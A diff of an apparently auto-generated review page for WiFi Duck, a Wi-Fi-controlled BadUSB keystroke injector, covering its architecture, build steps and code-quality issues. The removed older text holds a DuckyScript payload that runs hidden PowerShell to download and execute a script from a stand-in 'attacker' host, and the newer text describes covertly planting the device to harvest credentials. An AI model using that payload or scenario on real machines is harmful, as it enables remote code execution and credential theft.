@@ -60,7 +60,7 @@
             <div class="post-header">
                 <div class="post-meta">
                     <span>August 17, 2026</span>
-                    <span>3 min read</span>
+                    <span>4 min read</span>
                     <span class="post-language">C/C++ Header</span>
                     <span class="post-type">fork</span>
                 </div>
@@ -80,29 +80,47 @@
             </div>
 
             <div class="post-content numbered" id="post-content">
-                <nav class="post-toc" aria-label="Sections"><span class="post-toc-lab">Sections</span><a href="#the-problem">The Problem</a><a href="#what-this-does">What This Does</a><a href="#how-to-use-it">How To Use It</a><a href="#setup">Setup</a><a href="#example-for-esp8266">Example for ESP8266</a><a href="#configuration">Configuration</a><a href="#running">Running</a><a href="#real-world-use">Real‑World Use</a><a href="#delay-1000">DELAY 1000</a><a href="#code-health-issues">Code Health &amp; Issues</a><a href="#the-bottom-line">The Bottom Line</a></nav>
-                <h3 class="post-h" id="the-problem">The Problem</h3><p>Security trainers and penetration‑test teams need a low‑cost, easily programmable BadUSB that can be re‑programmed on‑the‑fly without opening the device or flashing a new binary each time. Existing solutions require SD cards or recompilation, which slows iteration and makes classroom demos cumbersome.</p><h3 class="post-h" id="what-this-does">What This Does</h3><p>WiFi Duck turns an ATmega32U4 or ESP8266 board into a wireless USB keyboard that serves a tiny web UI for script management.  
- The ATmega firmware lives in atmegaduck/atmegaduck.ino and its support library (keyboard.cpp/h, duckparser.cpp/h). Scripts are parsed by duckparser.cpp and sent as HID reports via usbhidkeys.h.  
- The ESP8266 side (espduck/espduck.ino) hosts the web server (webserver.cpp/h), stores scripts in SPIFFS (spiffs.cpp/h), and forwards commands to the ATmega over serial (serialbridge.cpp/h).  
- The front‑end (web/index.html, web/index.js, web/terminal.js, etc.) provides a code editor, file manager and “run” button that hits the ESP’s REST endpoints.</p><h3 class="post-h" id="how-to-use-it">How To Use It</h3><h3 class="post-h" id="setup">Setup</h3><p>Install the Arduino IDE (or VS Code Arduino extension).  
-Add the Arduino AVR Boards and ESP8266 cores via Boards Manager.  
-Open the appropriate sketch:  
-    atmegaduck/atmegaduck.ino for a pure ATmega32U4 board.  
-    espduck/espduck.ino for an ESP‑8266‑based WiFi Duck.  
-Select the target board (e.g., Arduino Leonardo for ATmega, NodeMCU 1.0 for ESP8266) and compile/upload.</p><h3 class="post-h" id="example-for-esp8266">Example for ESP8266</h3><p>arduino-cli compile --fqbn esp8266:esp8266:generic espduck/espduck.ino
-arduino-cli upload -p /dev/ttyUSB0 --fqbn esp8266:esp8266:generic espduck/espduck.ino</p><h3 class="post-h" id="configuration">Configuration</h3><p>Wi‑Fi SSID and password are stored in espduck/config.h. Edit the WIFISSID and WIFIPASS macros, then re‑flash.  
-Script files are kept in SPIFFS; the web UI writes directly to /scripts/ via the REST API defined in espduck/duckscript.cpp. No external config files are required.</p><h3 class="post-h" id="running">Running</h3><p>Power the device and connect a laptop to the AP wifiduck / wifiduck.  
-Browse to http://192.168.4.1.  
-Use the Editor tab to write a Ducky Script (e.g., STRING hello world).  
-Click Save → Run; the ESP forwards the script to the ATmega (serialbridge.cpp) which injects keystrokes via the HID driver.</p><h3 class="post-h" id="real-world-use">Real‑World Use</h3><p>A red‑team instructor can preload a payload that opens a reverse shell on any Windows host:</p><h3 class="post-h" id="delay-1000">DELAY 1000</h3><p>GUI r
-DELAY 200
-STRING powershell -nop -w hidden -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://attacker/payload.ps1&#39;)&quot;
-ENTER</p><p>The script is edited on a laptop, saved through the web UI, and executed instantly on the target PC when the device is plugged in—no SD card swaps, no recompilation.</p><h3 class="post-h" id="code-health-issues">Code Health &amp; Issues</h3><p>Medium – Lack of CI/CD – No GitHub Actions, Travis, or other pipelines; builds must be performed manually (.github only contains issue templates).  
-Low – Minimal test coverage – Only a single test.script file; no unit tests for parser or HID output.  
-Medium – Hard‑coded Wi‑Fi credentials – config.h stores SSID/password in source; changing them requires a re‑flash, limiting dynamic reconfiguration.  
-Low – Documentation gaps – README covers usage but does not detail the build environment (Arduino core versions, required libraries).  
-Medium – Potential buffer overflow – duckparser.cpp parses arbitrary script length into fixed‑size buffers without explicit length checks.  
-Low – License present – LICENSE is included, so reuse is permitted.</p><h3 class="post-h" id="the-bottom-line">The Bottom Line</h3><p>WiFi Duck provides a functional, low‑cost wireless BadUSB platform with a convenient web‑based script editor, making it valuable for training and quick proof‑of‑concept attacks. The codebase compiles with the Arduino toolchain, but the project lacks automated testing, CI, and runtime configurability, which raises maintenance overhead for production use. Teams comfortable with manual builds and willing to audit the parser can adopt it; larger organizations should address the highlighted risks before deployment.</p>
+                <nav class="post-toc" aria-label="Sections"><span class="post-toc-lab">Sections</span><a href="#the-problem">The Problem</a><a href="#what-this-does">What This Does</a><a href="#how-it-is-wired">How It Is Wired</a><a href="#how-to-use-it">How To Use It</a><a href="#real-world-use">Real‑World Use</a><a href="#code-health-issues">Code Health &amp; Issues</a><a href="#the-bottom-line">The Bottom Line</a></nav>
+                <h3 id="the-problem">The Problem</h3>
+<p>Operators need a low‑cost, Wi‑Fi‑controlled BadUSB that can be programmed on‑the‑fly without moving SD cards or reinstalling firmware. Existing BadUSB kits require manual flashing after each script change, which slows testing and deployment in red‑team exercises.</p>
+<h3 id="what-this-does">What This Does</h3>
+<p>WiFi Duck turns an ATmega32u4 or ESP8266 board into a wireless HID keyboard. The firmware (see <code>atmega_duck/atmega_duck.ino</code> and <code>esp_duck/esp_duck.ino</code>) runs a small web server (<code>esp_duck/webserver.cpp</code>) that serves the UI in <code>web/</code>. Scripts written in the DuckScript language are stored in the ESP’s SPIFFS (<code>esp_duck/spiffs.cpp</code>) and executed by the parser (<code>esp_duck/duckscript.cpp</code>). The same source tree also contains a desktop‑side converter (<code>webconverter.py</code>) that translates raw scripts into the binary format the device expects.</p>
+<h3 id="how-it-is-wired">How It Is Wired</h3>
+<p><strong>Entry points</strong></p>
+<ul><li><code>atmega_duck/atmega_duck.ino</code> – Arduino sketch for ATmega32u4 boards.</li><li><code>esp_duck/esp_duck.ino</code> – Arduino sketch for ESP8266 boards.</li><li><code>web/index.html</code> / <code>web/index.js</code> – browser UI loaded from the device.</li></ul>
+<p><strong>Core flow (ESP variant, the most feature‑complete)</strong></p>
+<ol><li><strong>Boot</strong> – <code>esp_duck.ino</code> calls <code>setup()</code> → <code>WebServer::begin()</code> (in <code>esp_duck/webserver.cpp</code>).</li><li><strong>Web UI</strong> – <code>webserver.cpp</code> registers HTTP handlers that serve files from <code>web/</code> (e.g., <code>index.html</code>, <code>script.js</code>).</li><li><strong>Script upload</strong> – UI posts a script to <code>/upload</code>. The handler invokes <code>Spiffs::writeFile()</code> (<code>esp_duck/spiffs.cpp</code>) to persist the script in SPIFFS.</li><li><strong>Execution request</strong> – UI triggers <code>/run</code>. Handler calls <code>DuckScript::run()</code> (<code>esp_duck/duckscript.cpp</code>).</li><li><strong>Parsing</strong> – <code>DuckScript::run()</code> creates a <code>DuckParser</code> (<code>esp_duck/duckscript.cpp</code> includes <code>duckparser.cpp</code> from the ATmega side) which tokenises the script and maps tokens to HID reports using tables in <code>usb_hid_keys.h</code>.</li><li><strong>Output</strong> – Parsed commands are sent to the USB HID stack via <code>Keyboard::press()</code> calls (implemented in <code>atmega_duck/keyboard.cpp</code> for ATmega and mirrored in ESP code).</li></ol>
+<p><strong>Responsibility map</strong></p>
+<div class="table-scroll"><table><thead><tr><th>File</th><th>Primary role</th></tr></thead><tbody><tr><td><code>esp_duck/webserver.cpp</code></td><td>HTTP server, routes UI actions</td></tr><tr><td><code>esp_duck/spiffs.cpp</code></td><td>Persistent storage of scripts</td></tr><tr><td><code>esp_duck/duckscript.cpp</code></td><td>Script interpreter entry point</td></tr><tr><td><code>atmega_duck/duckparser.cpp</code></td><td>Tokenisation and command mapping</td></tr><tr><td><code>atmega_duck/keyboard.cpp</code></td><td>Low‑level HID report generation</td></tr><tr><td><code>web/*.js</code> &amp; <code>web/*.html</code></td><td>Front‑end UI, JSON API calls</td></tr><tr><td><code>webconverter.py</code></td><td>Offline conversion of raw scripts to binary payload</td></tr></tbody></table></div>
+<p>The import graph shows no circular dependencies; each module is a leaf or a single‑direction consumer, so changes in <code>webserver.cpp</code> affect only the HTTP layer, while <code>duckparser.cpp</code> is the widest‑impact module (used by both ATmega and ESP builds).</p>
+<h3 id="how-to-use-it">How To Use It</h3>
+<pre data-lang="bash"><code># 1. Clone the repo
+git clone https://github.com/moses-y/WiFiDuck.git
+cd WiFiDuck
+
+# 2. Open the appropriate sketch in the Arduino IDE
+#    – ATmega32u4 board: atmega_duck/atmega_duck.ino
+#    – ESP8266 board:    esp_duck/esp_duck.ino
+#    Select the correct board type and upload.
+
+# 3. After flashing, the device creates Wi‑Fi AP “wifiduck” (default password “wifiduck”).
+#    Connect a client PC to that network.
+
+# 4. Open a browser to http://192.168.4.1 .
+#    The UI loads from web/*.html and web/*.js served by the firmware.
+
+# 5. Write a DuckScript in the “Script” pane, click **Save** → it is stored via SPIFFS.
+#    Click **Run** to execute the keystrokes on the host computer.
+
+# Optional: Convert a raw script to binary with the supplied tool
+python3 webconverter.py input.duck output.bin</code></pre>
+<p>Configuration files are hard‑coded in the sketches (<code>esp_duck/config.h</code> and <code>atmega_duck/config.h</code>). Changing SSID/password requires editing <code>esp_duck/settings.cpp</code> and re‑flashing, or using the UI’s Settings page which writes to SPIFFS and updates the runtime config.</p>
+<h3 id="real-world-use">Real‑World Use</h3>
+<p>A penetration tester deploys a DSTIKE ESP8266 board on a target’s USB hub. After a quick flash, they walk to the target site, connect a laptop to the AP, load a credential‑harvesting script via the browser UI, and trigger it when the victim plugs in the hub. The entire workflow takes minutes and leaves no visible storage media on the target.</p>
+<h3 id="code-health-issues">Code Health &amp; Issues</h3>
+<ul><li><strong>HIGH – No test suite</strong> – 20 source files, zero test files.</li><li><strong>HIGH – No CI pipeline</strong> – No GitHub Actions or other build automation present.</li><li><strong>LOW – Missing convention files</strong> – No <code>.editorconfig</code>, <code>.gitattributes</code>, or formatter config.</li><li><strong>HIGH – Deep nesting</strong> – <code>esp_duck/com.cpp</code>, <code>atmega_duck/duckparser.cpp</code>, <code>esp_duck/cli.cpp</code> each have indentation depth 8, making logic hard to follow.</li><li><strong>HIGH – Duplicated code</strong> – Repeated 6‑line blocks across 25 files (e.g., <code>Adafruit_DotStar.*</code>, <code>NeoPixel.*</code>, <code>com.*</code>).</li><li><strong>MEDIUM – Resource safety</strong> – <code>webconverter.py</code> opens files without a context manager, risking leaks on exception.</li><li><strong>MEDIUM – High branching density</strong> – <code>atmega_duck/Adafruit_DotStar.cpp</code>, <code>atmega_duck/duckparser.cpp</code>, <code>atmega_duck/parser.c</code> contain &gt;100 branch points in &lt;400 lines.</li></ul>
+<h3 id="the-bottom-line">The Bottom Line</h3>
+<p>WiFi Duck provides a functional, Wi‑Fi‑controlled BadUSB platform with a ready‑to‑use web UI and clear separation between firmware, storage, and parsing. The codebase suffers from maintainability problems (deep nesting, duplicated logic) and lacks basic engineering scaffolding (tests, CI, formatting rules). It is suitable for security researchers comfortable with Arduino tooling who can tolerate ad‑hoc code quality, but teams looking for a production‑grade, maintainable BadUSB framework will need to invest in refactoring and test infrastructure.</p>
             </div>
 
             
